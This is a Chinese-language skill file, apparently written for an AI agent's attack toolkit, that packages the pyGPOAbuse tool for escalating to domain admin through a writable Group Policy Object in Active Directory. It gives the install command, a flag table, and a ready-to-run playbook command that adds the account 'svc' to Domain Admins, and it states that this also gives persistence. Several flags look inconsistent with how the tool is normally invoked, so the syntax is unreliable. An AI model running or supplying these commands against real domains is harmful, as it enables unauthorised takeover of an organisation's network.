---
name: pygpoabuse-gpo-privesc
description: pyGPOAbuse: 可写 GPO 提权到域管。信号:ad攻击,域渗透,列出 GPO 详情,把用户加进组,滥用可写 GPO 提权。
---

# pyGPOAbuse

- 攻击大类:C30 AD与横向移动
- 上游仓库:https://github.com/Hackndo/pyGPOAbuse
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Hackndo/pyGPOAbuse && cd pyGPOAbuse && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 pygpoabuse DOMAIN/user -gpcname 'CN={GPO},CN=Policies,CN=System,DC=x'` | 列出 GPO 详情 |
| `-useraccount bob -addusertogroup 'CN=Admins,DC=x'` | 把用户加进组 |
| `-vuln -useraccount bob -addusertogroup 'CN=Admins,DC=corp,DC=local'` | 滥用可写 GPO 提权 |
| `-critical` | 标记关键组 |

## 攻击场景 Playbook

### 可写 GPO 提权到域管

```bash
python3 pygpoabuse CORP/svc -password 'Pass1' -gpcname 'CN={12345678-ABCD},CN=Policies,CN=System,DC=corp,DC=local' -vuln -useraccount svc -addusertogroup 'CN=Domain Admins,CN=Users,DC=corp,DC=local'
# 等 5-15 分钟组策略刷新生效,svc 进 Domain Admins
```

## 注意事项

对当前用户可写的 GPO 直接写入组策略实现提权/持久化,无需域管权限。
